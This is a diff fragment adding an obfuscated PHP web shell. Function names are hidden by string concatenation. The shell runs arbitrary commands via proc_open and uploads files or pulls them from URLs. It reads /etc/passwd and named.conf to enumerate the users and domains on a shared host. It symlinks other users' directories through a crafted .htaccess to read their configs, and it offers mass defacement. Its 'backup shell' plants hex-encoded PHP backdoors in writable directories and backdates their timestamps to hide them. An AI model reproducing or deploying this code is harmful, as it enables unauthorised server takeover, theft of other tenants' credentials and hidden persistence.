+		if (!$a($c)) {
+			return "?";
+		}
+		$d = $b($c($fl));
+		if (empty($d)) {
+			$e = $c($fl);
+			if (empty($e)) {
+				return "?";
+			} else {
+				return $e;
+			}
+		} else {
+			return $d['name'];
+		}
+	} elseif ($a($c)) {
+		return $c($fl);
+	} else {
+		return "?";
+	}
+}
+
+function fdt($fl) {
+	$a = "da"."te";
+	$b = "fil"."emt"."ime";
+    return $a("F d Y H:i:s", $b($fl));
+}
+
+function dunlut($fl) {
+	$a = "fil"."e_exi"."sts";
+	$b = "ba"."sena"."me";
+	$c = "fi"."les"."ize";
+	$d = "re"."ad"."fi"."le";
+	if ($a($fl) && isset($fl)) {
+		header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
+		header("Conte'.'nt-Control:public");
+		header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
+		header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="'.$b($fl).'"');
+		header('Exp'.'ires: 0');
+		header("Ex"."pired:0");
+		header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
+		header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
+		header('Pra'.'gma: pub'.'lic');
+		header('Con'.'ten'.'t-Le'.'ngth: ' .$c($fl));
+		flush();
+		$d($fl);
+		exit;
+	} else {
+		return "Fi"."le Not F"."ound !";
+	}
+}
+
+function komend($kom, $lk) {
+	$x = "pr"."eg_"."mat"."ch";
+	$xx = "2".">"."&"."1";
+	if (!$x("/".$xx."/i", $kom)) {
+		$kom = $kom." ".$xx;
+	}
+	$a = "fu"."ncti"."on_"."ex"."is"."ts";
+	$b = "p"."ro"."c_op"."en";
+	$c = "htm"."lspe"."cialc"."hars";
+	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
+	if ($a($b)) {
+		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
+		return "<pre>".$c($d($meki[1]))."</pre>";
+	} else {
+		return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";
+	}
+}
+
+function komenb($kom, $lk) {
+	$x = "pr"."eg_"."mat"."ch";
+	$xx = "2".">"."&"."1";
+	if (!$x("/".$xx."/i", $kom)) {
+		$kom = $kom." ".$xx;
+	}
+	$a = "fu"."ncti"."on_"."ex"."is"."ts";
+	$b = "p"."ro"."c_op"."en";
+	$c = "htm"."lspe"."cialc"."hars";
+	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
+	if ($a($b)) {
+		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
+		return $d($meki[1]);
+	} else {
+		return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";
+	}
+}
+
+function gtd() {
+	$a = "is_rea"."dable";$b = "fi"."le_ge"."t_con"."ten"."ts";
+	$c = "pr"."eg_ma"."tch_"."al"."l";$d = "fil"."e_exi"."sts";
+	$e = "sca"."ndi"."r";$f = "co"."unt";
+	$g = "arr"."ay_un"."ique";$h = "sh"."el"."l_"."ex"."ec";
+	$i = "pr"."eg_"."mat"."ch";
+	if ($a("/e"."tc"."/na"."me"."d.co"."nf")) {
+		$a = $b("/e"."tc"."/na"."me"."d.co"."nf");
+		$c("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $a, $b);
+		$b = $b[1]; return $f($g($b))." Dom"."ains";
+	} elseif ($d("/va"."r/na"."med"."/na"."me"."d.lo"."cal")) {
+		$a = $e("/v"."ar/"."nam"."ed");
+		return $f($a)." Dom"."ains";
+	} elseif ($a("/e"."tc"."/p"."as"."sw"."d")) {
+		$a = $b("/e"."tc"."/p"."as"."sw"."d");
+		if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
+			$c("/\/vh"."os"."ts\/(.*?):/i", $a, $b);
+			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
+		} else {
+			$c("/\/ho"."me\/(.*?):/i", $a, $b);
+			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
+		}
+	} elseif (!empty($h("ca"."t /e"."tc/"."pa"."ss"."wd"))) {
+		$a = $h("ca"."t /e"."tc/"."pa"."ss"."wd");
+		if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
+			$c("/\/vh"."os"."ts\/(.*?):/i", $a, $b);
+			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
+		} else {
+			$c("/\/ho"."me\/(.*?):/i", $a, $b);
+			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
+		}
+	} else {
+		return "0 Domains";
+	}
+}
+
+function esyeem($tg, $lk) {
+	$a = "fun"."cti"."on_e"."xis"."ts";
+	$b = "p"."ro"."c_op"."en";
+	$c = "htm"."lspe"."cialc"."hars";
+	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
+	$e = "sy"."mli"."nk";
+	if ($a("sy"."mli"."nk")) {
+		return $e($tg, $lk);
+	} elseif ($a("pr"."oc_op"."en")) {
+		$ps = $b("l"."n -"."s ".$tg." ".$lk, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
+		return $c($d($meki[1]));
+	} else {
+		return "Sy"."mli"."nk Fu"."nct"."ion is Di"."sab"."led !";
+	}
+}
+
+function sds($sads, &$results = array()) {
+	$iwr = "is"."_wri"."tab"."le";
+	$ira = "is_r"."eada"."ble";
+	$ph = "pr"."eg_ma"."tch";
+	$sa = "sc"."and"."ir";
+	$rh = "re"."alp"."ath";
+	$idr = "i"."s_d"."ir";
+	if (!$ira($sads) || !$iwr($sads) || $ph("/\/app"."licat"."ion\/|\/sy"."st"."em/i", $sads)) {
+		return false;
+	}
+    $files = $sa($sads);
+
+    foreach ($files as $key => $value) {
+        $path = $rh($sads . DIRECTORY_SEPARATOR . $value);
+        if (!$idr($path)) {
+            //$results[] = $path;
+        } else if ($value != "." && $value != "..") {
+            sds($path, $results);
+            $results[] = $path;
+        }
+    }
+
+    return $results;
+}
+
+function crul($web) {
+	$cr = "cu"."rl_set"."opt";
+	$cx = "cu"."rl_"."ex"."ec";
+	$ch = "cu"."rl_clo"."se";
+	$ceha = curl_init();
+	$cr($ceha, CURLOPT_URL, $web);
+	$cr($ceha, CURLOPT_RETURNTRANSFER, 1);
+	return $cx($ceha);
+	$ch($ceha);
+}
+
+function green($text) {
+	echo '<div class="alert-success-custom"><i class="fas fa-check-circle"></i> '.$text.'</div>';
+}
+
+function red($text) {
+	echo '<div class="alert-danger-custom"><i class="fas fa-exclamation-circle"></i> '.$text.'</div>';
+}
+
+function oren($text) {
+	return '<div class="alert-warning-custom"><i class="fas fa-exclamation-triangle"></i> '.$text.'</div>';
+}
+
+function tuls($nm, $lk) {
+	return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
+}
+
+echo '<div class="row mb-3">';
+echo '<div class="col-md-6"><strong><i class="fas fa-server"></i> Se'.'rv'.'er'.' I'.'P:</strong> <span class="text-gold">'.ipsrv().'</span></div>';
+echo '<div class="col-md-6"><strong><i class="fas fa-user"></i> Yo'.'ur I'.'P:</strong> <span class="text-gold">'.$_SERVER[$rad].'</span> <a href="?opsi=re'.'pip" class="badge badge-custom ms-2">Re'.'ver'.'se I'.'P</a></div>';
+echo '</div>';
+echo '<div class="row mb-3">';
+echo '<div class="col-md-6"><strong><i class="fas fa-globe"></i> We'.'b S'.'erv'.'er:</strong> <span class="text-gold">'.$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE'].'</span></div>';
+$unm = "ph"."p_u"."na"."me";
+echo '<div class="col-md-6"><strong><i class="fas fa-desktop"></i> Sys'.'tem:</strong> <span class="text-gold">'.@$unm().'</span></div>';
+echo '</div>';
+echo '<div class="row mb-3">';
+$gcu = "g"."et_"."curr"."ent"."_us"."er";
+$gmu = "g"."et"."my"."ui"."d";
+echo '<div class="col-md-6"><strong><i class="fas fa-user-circle"></i> Us'.'er:</strong> <span class="text-gold">'.@$gcu().' ('.@$gmu().')</span></div>';
+$phv = "ph"."pve"."rsi"."on";
+echo '<div class="col-md-6"><strong><i class="fas fa-code"></i> PH'.'P V'.'er'.'sio'.'n:</strong> <span class="text-gold">'.@$phv().'</span></div>';
+echo '</div>';
+echo '<div class="row mb-3">';
+echo '<div class="col-12"><strong><i class="fas fa-ban"></i> Dis'.'abl'.'e Fu'.'nct'.'ion:</strong> '.$disf.'</div>';
+echo '</div>';
+echo '<div class="row mb-3">';
+echo '<div class="col-md-6"><strong><i class="fas fa-globe"></i> Dom'.'ain'.'s:</strong> <span class="text-gold">'.(empty(gtd()) ? '0 Dom'.'ains' : gtd()).'</span></div>';
+echo '<div class="col-md-6"><strong><i class="fas fa-tools"></i> Extensions:</strong> ';
+if (@$fnct("my"."sql_co"."nne"."ct")) {
+    echo '<span class="badge bg-success me-1">MySQL</span>';
+} else {
+    echo '<span class="badge bg-danger me-1">MySQL</span>';
+}
+if (@$fnct("cu"."rl"."_in"."it")) {
+    echo '<span class="badge bg-success me-1">cURL</span>';
+} else {
+    echo '<span class="badge bg-danger me-1">cURL</span>';
+}
+if (@$fxt("/"."us"."r/b"."in/w"."get")) {
+    echo '<span class="badge bg-success me-1">WG'.'ET</span>';
+} else {
+    echo '<span class="badge bg-danger me-1">WG'.'ET</span>';
+}
+if (@$fxt("/u"."sr/b"."in"."/pe"."rl")) {
+    echo '<span class="badge bg-success me-1">Pe'.'rl</span>';
+} else {
+    echo '<span class="badge bg-danger me-1">Pe'.'rl</span>';
+}
+if (@$fxt("/"."us"."r/b"."in/p"."ytho"."n2")) {
+    echo '<span class="badge bg-success me-1">Pyt'.'ho'.'n</span>';
+} else {
+    echo '<span class="badge bg-danger me-1">Pyt'.'ho'.'n</span>';
+}
+if (@$fxt("/"."us"."r/b"."in/s"."u"."d"."o")) {
+    echo '<span class="badge bg-success me-1">S'.'u'.'do</span>';
+} else {
+    echo '<span class="badge bg-danger me-1">S'.'u'.'do</span>';
+}
+if (@$fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c")) {
+    echo '<span class="badge bg-success me-1">Pk'.'e'.'x'.'e'.'c</span>';
+} else {
+    echo '<span class="badge bg-danger me-1">Pk'.'e'.'x'.'e'.'c</span>';
+}
+echo '</div>';
+echo '</div>';
+echo '</div>';
+echo '<div class="breadcrumb-custom"><strong><i class="fas fa-folder-open"></i> Di'.'rect'.'ory:</strong> ';
+
+foreach($_POST as $key => $value){
+	$_POST[$key] = $sts($value);
+}
+
+if(isset($_GET['loknya'])){
+	$lokasi = $_GET['loknya'];
+	$lokdua = $_GET['loknya'];
+} else {
+	$lokasi = $gcw();
+	$lokdua = $gcw();
+}
+
+$lokasi = $srl('\\','/',$lokasi);
+$lokasis = $exp('/',$lokasi);
+$lokasinya = @$scd($lokasi);
+
+foreach($lokasis as $id => $lok){
+	if($lok == '' && $id == 0){
+		$a = true;
+		echo '<a href="?loknya=/">/</a>';
+		continue;
+	}
+	if($lok == '') continue;
+	echo '<a href="?loknya=';
+	for($i=0;$i<=$id;$i++){
+	echo "$lokasis[$i]";
+	if($i != $id) echo "/";
+} 
+echo '">'.$lok.'</a>/';
+}
+
+echo '</div>';
+if (isset($_POST['upwkwk'])) {
+	if (isset($_POST['berkasnya'])) {
+		if ($_POST['di'.'rnya'] == "2") {
+			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
+		}
+		if (empty($_FILES['ber'.'kas']['name'])) {
+			echo oren("Fi"."le not Se"."lected !");
+		} else {
+			$tgn = $ftm($lokasi);
+			$data = @$fpt($lokasi."/".$_FILES['ber'.'kas']['name'], @$fgt($_FILES['ber'.'kas']['tm'.'p_na'.'me']));
+				if ($fxt($lokasi."/".$_FILES['ber'.'kas']['name'])) {
+					$fl = $lokasi."/".$_FILES['ber'.'kas']['name'];
+					green("Fi"."le Upl"."oa"."ded! <strong>".$fl."</strong>");
+					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
+						echo '<div class="alert-success-custom">Li'.'nk: <a href="'.$lwb.'" class="text-gold">'.$lwb.'</a></div>';
+					}
+					@$tch($lokasi, $tgn);@$tch($lokasi."/".$_FILES['ber'.'kas']['name'], $tgn);
+				} else {
+					red("Fa"."ile"."d to Up"."lo"."ad !");
+			}
+		}
+	} elseif (isset($_POST['linknya'])) {
+		if (empty($_POST['namalink'])) {
+			echo oren("Fi"."lename cannot be empty !");
+		} elseif (empty($_POST['darilink'])) {
+			echo oren("Li"."nk cannot be empty !");
+		} else {
+			if ($_POST['di'.'rnya'] == "2") {
+			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
+			}
+				$tgn = $ftm($lokasi);
+				$data = @$fpt($lokasi."/".$_POST['namalink'], @$fgt($_POST['darilink']));
+				if ($fxt($lokasi."/".$_POST['namalink'])) {
+					$fl = $lokasi."/".$_POST['namalink'];
+					green("Fi"."le Uplo"."ade"."d! <strong>".$fl."</strong>");
+					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
+						echo '<div class="alert-success-custom">Li'.'nk: <a href="'.$lwb.'" class="text-gold">'.$lwb.'</a></div>';
+					}
+					@$tch($lokasi, $tgn);@$tch($lokasi."/".$_POST['namalink'], $tgn);
+				} else {
+					red("Fa"."iled to Up"."lo"."ad !");
+				}
+		}
+	}
+}
+
+echo '<div class="info-card">';
+echo '<h5><i class="fas fa-upload"></i> Uplo'.'ad Fi'.'le</h5>';
+echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost" class="mb-0">';
+echo '<div class="mb-3">';
+echo '<div class="form-check form-check-inline">';
+echo '<input class="form-check-input" type="radio" value="1" name="di'.'rnya" id="dir1" checked>';
+echo '<label class="form-check-label" for="dir1">cur'.'ren'.'t_di'.'r ['.cdrd().']</label>';
+echo '</div>';
+echo '<div class="form-check form-check-inline">';
+echo '<input class="form-check-input" type="radio" value="2" name="di'.'rnya" id="dir2">';
+echo '<label class="form-check-label" for="dir2">docu'.'men'.'t_ro'.'ot ['.crt().']</label>';
+echo '</div>';
+echo '</div>';
+echo '<input type="hidden" name="upwkwk" value="aplod">';
+echo '<div class="row g-2 mb-3">';
+echo '<div class="col-md-8">';
+echo '<input type="fi'.'le" name="berkas" class="form-control">';
+echo '</div>';
+echo '<div class="col-md-4">';
+echo '<button type="submit" name="berkasnya" class="btn btn-primary-custom w-100"><i class="fas fa-upload"></i> Up'.'load</button>';
+echo '</div>';
+echo '</div>';
+echo '<div class="row g-2">';
+echo '<div class="col-md-5">';
+echo '<input type="text" name="darilink" class="form-control" placeholder="https://go'.'ogle.com/upl'.'oad.txt">';
+echo '</div>';
+echo '<div class="col-md-3">';
+echo '<input type="text" name="namalink" class="form-control" placeholder="fi'.'le.txt">';
+echo '</div>';
+echo '<div class="col-md-4">';
+echo '<button type="submit" name="linknya" class="btn btn-primary-custom w-100"><i class="fas fa-link"></i> Upload from URL</button>';
+echo '</div>';
+echo '</div>';
+echo '</form>';
+echo '</div>';
+echo '<div class="info-card">';
+echo '<h5><i class="fas fa-terminal"></i> Co'.'mm'.'an'.'d</h5>';
+echo '<form method="post" enctype="appl'.'ication/x-ww'.'w-form-u'.'rlencoded" class="mb-0">';
+echo '<div class="input-group">';
+echo '<input type="text" name="komend" class="form-control" value="';
+if (isset($_POST['komend'])) {
+	echo $hsc($_POST['komend']);
+} else {
+	echo "un"."am"."e -"."a";
+}
+echo '">';
+echo '<button type="submit" name="komends" class="btn btn-primary-custom"><i class="fas fa-play"></i> Run</button>';
+echo '</div>';
+echo '</form>';
+echo '</div>';
+
+echo '<div class="nav-menu">';
+echo '<a href="'.$_SERVER['SC'.'RIP'.'T_N'.'AME'].'"><i class="fas fa-home"></i> HO'.'ME</a>';
+echo '<a href="'.$_SERVER['SC'.'RIP'.'T_N'.'AME'].'?loknya='.$lokasi.'&opsi=bekup"><i class="fas fa-save"></i> BA'.'CKUP SH'.'ELL</a>';
+echo '<a href="'.$_SERVER['SC'.'RIP'.'T_N'.'AME'].'?loknya='.$lokasi.'&opsi=lompat"><i class="fas fa-rocket"></i> JU'.'MP'.'ING</a>';
+echo '<a href="'.$_SERVER['SC'.'RIP'.'T_N'.'AME'].'?loknya='.$lokasi.'&opsi=mdf"><i class="fas fa-fire"></i> MA'.'SS DE'.'FA'.'CE</a>';
+echo '<a href="'.$_SERVER['SC'.'RIP'.'T_N'.'AME'].'?loknya='.$lokasi.'&opsi=esyeem"><i class="fas fa-link"></i> SY'.'ML'.'INK</a>';
+echo '</div>';
+
+if (isset($_GET['loknya']) && $_GET['opsi'] == "lompat") {
+	if ($ird("/e"."tc"."/p"."as"."sw"."d")) {
+		$fjp = $fgt("/e"."tc"."/p"."as"."sw"."d");
+	} elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) {
+		$fjp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
+	} else {
+		die(red("[!] Gagal Mengambil Di"."rect"."ory !"));
+	}
+	$pma("/\/ho"."me\/(.*?):/i", $fjp, $fjpr);
+	$fjpr = $fjpr[1];
+	if (empty($fjpr)) {
+		die(red("[!] Tidak Ada Us"."er di Temukan !"));
+	}
+	echo "Total Ada ".$ctn($aru($fjpr))." di"."rec"."to"."ry di Ser"."ver <font color=gold>".$_SERVER[$rad]."</font><br><br>";
+	foreach ($aru($fjpr) as $fj) {
+		$fjh = "/h"."om"."e/".$fj."/pu"."bl"."ic_h"."tml";
+		if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
+			$etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
+			$pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en);
+			$en = $en[1];
+			if ($ird($fjh)) {
+				echo "[<font color=green>Re"."ada"."ble</font>] <a href='".$_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$fjh."'>".$fjh."</a> => ";
+			} else {
+				echo "[<font color=red>Un"."rea"."dab"."le</font>] ".$fjh."</a> => ";
+			}
+			foreach ($aru($en) as $enw) {
+				$asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw));
+				$asd = $asd['name'];
+				if ($asd == $fj) {
+					echo "<a href='http://".$enw."' target=_blank><font color=gold>".$enw."</font></a>, ";
+				}
+			}
+			echo "<br>";
+		} else {
+			if ($ird($fjh)) {
+				echo "[<font color=green>Re"."ada"."ble</font>] <a href='".$_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$fjh."'>".$fjh."</a><br>";
+			} else {
+				echo "[<font color=red>Un"."rea"."dab"."le</font>] ".$fjh."</a><br>";
+			}
+		}
+	}
+	echo "<hr>";
+	die(author());
+} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "esyeem") {
+	if ($ird("/e"."tc"."/p"."as"."sw"."d")) {
+		$syp = $fgt("/e"."tc"."/p"."as"."sw"."d");
+	} elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) {
+		$syp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
+	} else {
+		die(red("[!] Gagal Mengambil Di"."rec"."to"."ry !"));
+	}
+	if (!$fnct("sy"."mli"."nk")) {
+		if (!$fnct("pr"."oc_"."op"."en")) {
+			die(red("[!] Sy"."mli"."nk Fu"."nct"."ion is Di"."sabl"."ed !"));
+		}
+	}
+	echo "<center>[ <gold>GR"."AB CO"."NFIG</gold> ] - [ <a href=".$_SERVER['R'.'EQ'.'UE'.'ST_'.'UR'.'I']."&opsidua=s"."yfile><gold>SY"."MLI"."NK FI"."LE</gold></a> ] - [ <gold>SY"."MLI"."NK VH"."OST</gold> ]</center>";
+	if (isset($_GET['opsidua'])) {
+		if ($_GET['opsidua'] == "gra"."bco"."nfig") {
+			# code...
+		} elseif ($_GET['opsidua'] == "s"."yfile") {
+			echo "<br><br><center>Opsi : <gold>Sy"."mli"."nk Fi"."le</gold>";
+			echo '<form method="post">File : 
+			<input type="text" name="domena" style="cursor: pointer; border-color: #000" class="up" placeholder="/ho'.'me/'.'use'.'r/p'.'ubli'.'c_ht'.'ml/da'.'tab'.'ase.'.'php">
+			<input type="submit" name="gaskeun" value="Gaskeun" class="up" style="cursor: pointer">
+			</form></center>';
+			if (isset($_POST['gaskeun'])) {
+				$rend = rand().".txt";
+				$lokdi = $_POST['domena'];
+				esyeem($lokdi, "an"."on_s"."ym/".$rend);
+				echo '<br><center>Cek : <a href="an'.'on_'.'sy'.'m/'.$rend.'"><gold>'.$rend."</gold></a></center><br>";
+			}
+		}
+		echo "<hr>";
+		die(author());
+	}
+	$pma("/\/ho"."me\/(.*?):/i", $syp, $sypr);
+	$sypr = $sypr[1];
+	if (empty($sypr)) {
+		die(red("[!] Tidak Ada Us"."er di Temukan !"));
+	}
+	echo "Total Ada ".$ctn($aru($sypr))." Us"."er di Ser"."ver <font color=gold>".$_SERVER[$rad]."</font><br><br>";
+	if (!$isw(getcwd())) {
+		die(red("[!] Gagal Sy"."mli"."nk - Red D"."ir !"));
+	}
+	if (!$fxt("an"."on_"."sy"."m")) {
+		$mdr("an"."on_"."sy"."m");
+	}
+	if (!$fxt("an"."on_"."sy"."m/.ht"."acc"."ess")) {
+		$fpt("an"."on_"."sy"."m/."."h"."ta"."cce"."ss", $urd("Opt"."ions%20In"."dexe"."s%20Fol"."lowSy"."mLi"."nks%0D%0ADi"."rect"."oryIn"."dex%20sss"."sss.htm%0D%0AAdd"."Type%20txt%20.ph"."p%0D%0AAd"."dHand"."ler%20txt%20.p"."hp"));
+	}
+	$ckn = esyeem("/", "an"."on_"."sy"."m/anon");
+	foreach ($aru($sypr) as $sj) {
+		$sjh = "/h"."om"."e/".$sj."/pu"."bl"."ic_h"."tml";
+		$ygy = $srl($bsn($_SERVER['SC'.'RI'.'PT_NA'.'ME']), "an"."on_"."sy"."m/anon".$sjh, $_SERVER['SC'.'RI'.'PT_NA'.'ME']);
+		if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
+			$etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
+			$pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en);
+			$en = $en[1];
+			echo "[<font color=gold>Sy"."mli"."nk</font>] <a href='".$ygy."' target=_blank>".$sjh."</a> => ";
+			foreach ($aru($en) as $enw) {
+				$asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw));
+				$asd = $asd['name'];
+				if ($asd == $sj) {
+					echo "<a href='http://".$enw."' target=_blank><font color=gold>".$enw."</font></a>, ";
+				}
+			}
+			echo "<br>";
+		} else {
+			echo "[<font color=gold>Sy"."mli"."nk</font>] <a href='".$ygy."' target=_blank>".$sjh."</a><br>";
+		}
+	}
+	echo "<hr>";
+	die(author());
+} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "bekup") {
+	if (isset($_POST['lo'.'kr'.'una'])) {
+		echo "<center>";
+		echo "Path : <gold>".$hsc($_POST['lo'.'kr'.'una'])."</gold><br>";
+		if (!$isr($_POST['lo'.'kr'.'una'])) {
+			die(red("[+] Cur"."rent Pa"."th is Unre"."adable !"));
+		} elseif (!$isw($_POST['lo'.'kr'.'una'])) {
+			die(red("[+] Cur"."rent Pa"."th is Un"."wri"."tea"."ble !"));
+		}
+		$loks = sds($_POST['lo'.'kr'.'una']);
+		$pisah = $ars($loks, -50);
+		$los = $arr($pisah, 2);
+		$satu = $loks[$los[0]];
+		$satut = $ftm($satu);
+		$dua = $loks[$los[1]];
+		$duat = $ftm($dua);
+		if (empty($satu) && empty($dua)) {
+			die(red("[+] Unknown Error !"));
+		}
+		echo "<br>";
+		if (!$isw($satu)) {
+			echo "[<merah>Fa"."il"."ed</merah>] ".$satu."<br>";
+		} else {
+			$satus = $satu."/cont"."act.p"."hp";
+			$fpt($satus, $h2b("3c6d65746120636f6e74656e743d226e6f696e646578226e616d653d22726f626f7473223e436f6e74616374204d653c666f726d20656e63747970653d226d756c7469706172742f666f726d2d64617461226d6574686f643d22706f7374223e3c696e707574206e616d653d226274756c22747970653d2266696c65223e3c627574746f6e3e4761736b616e3c2f627574746f6e3e3c2f666f726d3e3c3f3d22223b24613d2766272e2769272e276c272e2765272e275f272e2770272e2775272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24623d2766272e2769272e276c272e2765272e275f272e2767272e2765272e2774272e275f272e2763272e276f272e276e272e2774272e2765272e276e272e2774272e2773273b24633d2774272e276d272e2770272e275f272e276e272e2761272e276d272e2765273b24643d2768272e276578272e273262272e27696e273b24663d2766272e27696c272e27655f65272e277869272e277374272e2773273b696628697373657428245f46494c45535b276274756c275d29297b246128245f46494c45535b276274756c275d5b276e616d65275d2c246228245f46494c45535b276274756c275d5b24635d29293b696628246628272e2f272e245f46494c45535b276274756c275d5b276e616d65275d29297b6563686f20274f6b652021273b7d656c73657b6563686f20274661696c2021273b7d7d696628697373657428245f4745545b27667074275d29297b246128246428245f504f53545b2766275d292c246428245f504f53545b2764275d29293b696628246628246428245f504f53545b2766275d2929297b6563686f20224f6b652021223b7d656c73657b6563686f20224661696c2021223b7d7d3f3e"));
+			$tch($satus, $satut);
+			$tch($satu, $satut);
+			echo "[<ijo>Su"."cc"."ess</ijo>] ".$satus."<br>";
+			if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+				$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $satus);
+				$satul = "<br><a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
+			}
+		}
+		if (!$isw($dua)) {
+			echo "[<merah>Fa"."il"."ed</merah>] ".$dua."<br>";
+		} else {
+			$duas = $dua."/setti"."ng.p"."hp";
+			$fpt($duas, $h2b("3c6d657461206e616d653d22726f626f74732220636f6e74656e743d226e6f696e646578223e0d0a4d792053657474696e670d0a3c3f7068700d0a2461203d20226669222e226c655f70222e2275745f63222e226f6e74222e2265222e226e74222e2273223b0d0a2462203d202266222e22696c222e22655f6765222e2274222e225f636f222e226e74656e74222e2273223b0d0a2463203d20226669222e226c65222e225f6578222e226973222e227473223b0d0a2464203d202268222e226578222e223262222e22696e223b0d0a69662028697373657428245f504f53545b276b6f64275d2929207b0d0a09246128245f504f53545b276c6f6b275d2c20246428245f504f53545b276b6f64275d29293b0d0a0969662028246328245f504f53545b276c6f6b275d2929207b0d0a09096563686f20224f4b202120223b0d0a097d20656c7365207b0d0a09096563686f20224661696c6564202120223b0d0a097d0d0a7d0d0a69662028697373657428245f4745545b276963275d2929207b0d0a09696e636c75646520245f4745545b276963275d3b0d0a7d0d0a69662028697373657428245f4745545b276170275d2929207b0d0a0924612822776b776b2e706870222c20246428223363366436353734363132303665363136643635336432323732366636323666373437333232323036333666366537343635366537343364323236653666363936653634363537383232336534333666366537343631363337343230346436353363363636663732366432303664363537343638366636343364323237303666373337343232323036353665363337343739373036353364323236643735366337343639373036313732373432663636366637323664326436343631373436313232336533633639366537303735373432303734373937303635336432323636363936633635323232303665363136643635336432323632373437353663323233653363363237353734373436663665336534373631373336623631366533633266363237353734373436663665336533633266363636663732366433653061336333663730363837303061323436313230336432303232363632323265323236393232326532323663323232653232363532323265323235663232326532323730323232653232373532323265323237343232326532323566323232653232363332323265323236663232326532323665323232653232373432323265323236353232326532323665323232653232373432323265323237333232336230613234363232303364323032323636323232653232363932323265323236633232326532323635323232653232356632323265323236373232326532323635323232653232373432323265323235663232326532323633323232653232366632323265323236653232326532323734323232653232363532323265323236653232326532323734323232653232373332323362306132343633323033643230323237343232326532323664323232653232373032323265323235663232326532323665323232653232363132323265323236643232326532323635323233623061363936363230323836393733373336353734323832343566343634393463343535333562323736323734373536633237356432393239323037623234363132383234356634363439346334353533356232373632373437353663323735643562323736653631366436353237356432633230323436323238323435663436343934633435353335623237363237343735366332373564356232343633356432393239336236393636323032383636363936633635356636353738363937333734373332383232326532663232326532343566343634393463343535333562323736323734373536633237356435623237366536313664363532373564323932393230376236353633363836663230323234663662363532303231323233623764323036353663373336353230376236353633363836663230323234363631363936633230323132323362376437643061336633652229293b0d0a096966202824632822776b222e22776b2e222e227068222e2270222929207b0d0a09096563686f20224f4b2021223b0d0a097d0d0a7d0d0a3f3e"));
+			$tch($duas, $duat);
+			$tch($dua, $duat);
+			echo "[<ijo>Su"."cc"."ess</ijo>] ".$duas."<br>";
+			if ($sps($_POST['lo'.'kr'.'una'], $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
+				$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb, $duas);
+				$dual = "<a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
+			}
+		}
+		echo "<br>";
+		if (!empty($satul)) {
+			echo $satul;
+		}
+		if (!empty($dual)) {
+			echo $dual;
+		}
+		echo "</center>";
+	} else {
+		echo "<center>Masukkan Lokasi Docu"."ment Ro"."ot<br>";
+		echo '<form method="post"><input type="text" name="lokruna" value="'.$hsc($_GET['loknya']).'" style="cursor: pointer; border-color: #000" class="up"> ';
